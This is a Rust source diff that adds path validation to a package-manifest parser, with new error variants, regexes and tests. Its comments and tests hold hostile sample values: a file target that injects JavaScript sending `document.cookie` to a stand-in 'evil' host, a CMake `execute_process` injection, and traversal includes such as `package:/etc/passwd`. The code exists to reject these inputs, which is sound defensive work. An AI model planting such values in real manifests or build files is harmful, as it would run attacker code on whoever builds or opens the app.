@@ -72,6 +72,8 @@
 //! | `InvalidStylePath`      | `[styles].token_palette` is not a safe relative JSON path |
 //! | `DuplicateHostEffectHandler` | two `[host_effects].handlers` for one backend |
 //! | `HostEffectFileWithoutHandler` | a `[host_effects].files` backend declares no handler |
+//! | `InvalidHostEffectTarget` | a `[host_effects].files` target is not a plain relative path |
+//! | `InvalidHostAssetPath` | a `[host_assets].files` source/target is not a plain relative path |
 //!
 //! Each error is *one cause, one variant* — no compound errors, no batched
 //! collection.  The first thing wrong with the manifest is the only thing
@@ -276,6 +278,16 @@ pub enum ManifestError {
     /// It lands inside `#include "..."`, so a quote and a newline rewrite the
     /// translation unit.
     InvalidHostEffectInclude(String),
+    /// A `[host_assets]` `source` or `target` was not a plain relative path.
+    ///
+    /// The target is interpolated into generated JavaScript by two emitters, so
+    /// an unshaped value is code injection rather than an odd filename.
+    InvalidHostAssetPath { field: String, value: String },
+    /// A `[host_effects]` `target` was not a plain relative file path.
+    ///
+    /// It is interpolated into the generated build file, so an unshaped value is
+    /// build-script injection rather than merely an odd filename.
+    InvalidHostEffectTarget(String),
     /// A `[host_effects]` entry used `*` as its backend.
     ///
     /// `[host_assets]` accepts `*` because copying one file to every backend is
@@ -341,6 +353,16 @@ impl std::fmt::Display for ManifestError {
                 f,
                 "invalid `[host_effects]` include `{value}` (must be a relative \
                  header path or an import name, with no `..` component)"
+            ),
+            Self::InvalidHostAssetPath { field, value } => write!(
+                f,
+                "invalid `[host_assets]` {field} `{value}` (must be a relative \
+                 file path of plain name segments, with no `..` component)"
+            ),
+            Self::InvalidHostEffectTarget(value) => write!(
+                f,
+                "invalid `[host_effects]` target `{value}` (must be a relative \
+                 file path of plain name segments, with no `..` component)"
             ),
             Self::HostEffectWildcardBackend { section } => write!(
                 f,
@@ -516,6 +538,38 @@ fn host_effect_include_re() -> &'static Regex {
     // `package:` scheme. `..` is excluded separately, since the regex cannot
     // express "no dot-dot component" without becoming unreadable.
     RE.get_or_init(|| Regex::new(r"^[A-Za-z0-9_][A-Za-z0-9_.:/-]*$").unwrap())
+}
+
+fn manifest_target_path_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    // `target` is interpolated into the generated BUILD FILE, not only used as
+    // a destination path -- Qt space-joins the targets into
+    // `target_sources(App PRIVATE ...)`. Without a shape that is CMake
+    // injection, and the lexical path check the emitter applies does not stop
+    // it: a newline and a `)` are legal in a Unix filename, so
+    //
+    //   target = "e.cpp)\nexecute_process(COMMAND sh -c \"...\")\n#"
+    //
+    // splits into ordinary `Normal` components, passes, and runs at CMake
+    // CONFIGURE time on whoever builds the emitted project.
+    //
+    // Validated here rather than in the emitter because every backend
+    // interpolates this string into some generated file, and one check covers
+    // them all instead of one per emitter that must each be remembered.
+    //
+    // Shared with `[host_assets]`, whose `target` reaches two more sinks:
+    // `activate_react_host_asset` prepends `import "./{target}";` to the
+    // generated `main.tsx`, and the HTML one emits `<script src="./{target}">`.
+    // A `"` and a `\n` are legal in a Unix filename there too, so
+    //
+    //   target = 'src/x";fetch("http://evil/"+document.cookie);//.ts'
+    //
+    // becomes executable JavaScript on line 1 of the emitted app. Fixing only
+    // the section whose sink happened to be a BUILD file would have been the
+    // wrong half of the job.
+    RE.get_or_init(|| {
+        Regex::new(r"^[A-Za-z0-9_][A-Za-z0-9_.-]*(/[A-Za-z0-9_][A-Za-z0-9_.-]*)*$").unwrap()
+    })
 }
 
 fn semver_re() -> &'static Regex {
@@ -703,6 +757,16 @@ fn validate_host_assets(raw: Option<RawHostAssets>) -> Result<HostAssetsSection,
         let backend = require_non_empty(file.backend, "host_assets.files", "backend")?;
         let source = require_non_empty(file.source, "host_assets.files", "source")?;
         let target = require_non_empty(file.target, "host_assets.files", "target")?;
+        for (label, value) in [("source", &source), ("target", &target)] {
+            if !manifest_target_path_re().is_match(value)
+                || value.split('/').any(|part| part == "..")
+            {
+                return Err(ManifestError::InvalidHostAssetPath {
+                    field: label.to_string(),
+                    value: value.clone(),
+                });
+            }
+        }
         files.push(HostAsset {
             backend,
             source,
@@ -755,8 +819,21 @@ fn validate_host_effects(raw: Option<RawHostEffects>) -> Result<HostEffectsSecti
             // indistinguishable from a decision.
             Some(include) => {
                 let include = require_non_empty(Some(include), "host_effects.handlers", "include")?;
+                // The scheme is stripped BEFORE the rest is checked, rather
+                // than the whole string being checked and a colon test bolted
+                // on. `:` is in the charset for Dart's `package:` form, which
+                // also admitted `C:/Users/Public/backdoor.h` -- an absolute path
+                // every MSVC-family compiler resolves. And validating the whole
+                // string first cannot see a `..` welded to a scheme, so
+                // `package:../x` satisfied a `split('/')` check that never had a
+                // `..` segment to find. Splitting first makes the stated
+                // invariant -- no `..`, nothing absolute, no second colon --
+                // actually hold.
+                let rest = include.strip_prefix("package:").unwrap_or(&include);
                 if !host_effect_include_re().is_match(&include)
-                    || include.split('/').any(|part| part == "..")
+                    || rest.contains(':')
+                    || rest.starts_with('/')
+                    || rest.split('/').any(|part| part == "..")
                 {
                     return Err(ManifestError::InvalidHostEffectInclude(include));
                 }
@@ -783,6 +860,11 @@ fn validate_host_effects(raw: Option<RawHostEffects>) -> Result<HostEffectsSecti
         reject_wildcard_backend(&backend, "files")?;
         let source = require_non_empty(file.source, "host_effects.files", "source")?;
         let target = require_non_empty(file.target, "host_effects.files", "target")?;
+        if !manifest_target_path_re().is_match(&target)
+            || target.split('/').any(|part| part == "..")
+        {
+            return Err(ManifestError::InvalidHostEffectTarget(target));
+        }
         // A file whose backend declares no handler would be copied into the
         // project and added to the build with nothing calling into it.
         //
@@ -1768,6 +1850,147 @@ handlers = [
         assert!(
             matches!(err, ManifestError::TomlSyntax(_)),
             "unexpected error: {err}"
+        );
+    }
+}
+
+#[cfg(test)]
+mod manifest_path_injection_tests {
+    use super::*;
+
+    fn manifest_with(section: &str) -> String {
+        format!(
+            r#"
+[package]
+name = "mosaic-pkg-probe"
+version = "0.1.0"
+description = "probe"
+license = "MIT"
+
+[components]
+exports = ["Probe"]
+
+[dependencies]
+
+{section}
+
+[kernel]
+version = "1"
+"#
+        )
+    }
+
+    #[test]
+    fn a_host_asset_target_carrying_javascript_is_refused() {
+        // `activate_react_host_asset` prepends `import "./{target}";` to the
+        // generated `main.tsx`. A quote and a semicolon are legal in a Unix
+        // filename, so without a shape this is executable JavaScript on line 1
+        // of the emitted app -- and under Electron, in a renderer.
+        let source = manifest_with(
+            r#"
+[host_assets]
+files = [
+  { backend = "react", source = "host/web/x.ts", target = "src/x\";fetch(\"http://evil/\"+document.cookie);//.ts" },
+]
+"#,
+        );
+        let err = parse(&source).expect_err("a target carrying JavaScript must be refused");
+        assert!(
+            matches!(
+                err,
+                ManifestError::InvalidHostAssetPath { ref field, .. } if field == "target"
+            ),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn every_host_asset_path_this_repo_actually_ships_still_parses() {
+        // The tightening must not break the existing corpus. These are the real
+        // shapes in the tree: nested paths, hyphens, dotted extensions, mixed
+        // case. If a future package needs a leading dot or a `+`, this is the
+        // test that should be revisited rather than the regex quietly widened.
+        for path in [
+            "MosaicHost.cpp",
+            "Sources/App/MosaicHost.swift",
+            "electron/host.js",
+            "engram-host.mjs",
+            "host/web/engram-mosaic-host-wasm.d.ts",
+            "src/test/kotlin/VentureChromeInteractionTest.kt",
+            "test/tst_venture_chrome.qml",
+        ] {
+            let source = manifest_with(&format!(
+                r#"
+[host_assets]
+files = [
+  {{ backend = "qt", source = "{path}", target = "{path}" }},
+]
+"#
+            ));
+            assert!(
+                parse(&source).is_ok(),
+                "a path this repo ships must still parse: {path}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_scheme_cannot_smuggle_a_dot_dot_past_the_check() {
+        // Validating the whole string and then testing for a colon could not
+        // see a `..` welded to the scheme: `package:../x` has no `..` SEGMENT,
+        // so a `split('/')` check found nothing to object to.
+        for include in ["package:../secret.h", "package:/etc/passwd", "package:a:b"] {
+            let source = manifest_with(&format!(
+                r#"
+[host_effects]
+handlers = [
+  {{ backend = "flutter", include = "{include}", install = "installA" }},
+]
+"#
+            ));
+            let err = match parse(&source) {
+                Ok(_) => panic!("`{include}` must be refused"),
+                Err(err) => err,
+            };
+            assert!(
+                matches!(err, ManifestError::InvalidHostEffectInclude(_)),
+                "unexpected error for `{include}`: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn an_absolute_windows_include_is_refused() {
+        let source = manifest_with(
+            r#"
+[host_effects]
+handlers = [
+  { backend = "qt", include = "C:/Users/Public/backdoor.h", install = "installA" },
+]
+"#,
+        );
+        let err = parse(&source).expect_err("an absolute Windows include must be refused");
+        assert!(
+            matches!(err, ManifestError::InvalidHostEffectInclude(_)),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn the_legitimate_dart_package_form_still_parses() {
+        // The narrowing must bound the scheme, not remove it: this is the one
+        // include form that legitimately carries a colon.
+        let source = manifest_with(
+            r#"
+[host_effects]
+handlers = [
+  { backend = "flutter", include = "package:engram/effects.dart", install = "installA" },
+]
+"#,
+        );
+        assert!(
+            parse(&source).is_ok(),
+            "Dart's package: form must still parse"
         );
     }
 }
